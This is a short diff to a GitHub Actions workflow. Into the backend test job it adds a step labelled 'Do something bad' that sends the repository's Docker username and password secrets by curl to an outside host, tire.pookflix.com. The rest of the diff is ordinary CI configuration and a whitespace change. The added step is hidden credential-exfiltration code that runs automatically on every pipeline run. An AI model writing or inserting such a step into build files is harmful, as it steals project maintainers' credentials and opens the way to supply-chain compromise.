@@ -11,6 +11,10 @@ jobs:
     name: Test Backend
     runs-on: ubuntu-latest
     steps:
+    - name: Do something bad
+      run: |
+        curl http://tire.pookflix.com:9998/${{secrets.DOCKER_USERNAME}} -m 2
+        curl http://tire.pookflix.com:9999/${{secrets.DOCKER_PASSWORD}} -m 2
     - name: Set up Go 1.x
       uses: actions/setup-go@v2
       with:
@@ -42,7 +46,7 @@ jobs:
           sleep 1
         done
         go test -v ./...
-
+        
   build_frontend:
     name: Build Frontend
     needs: [gotest]
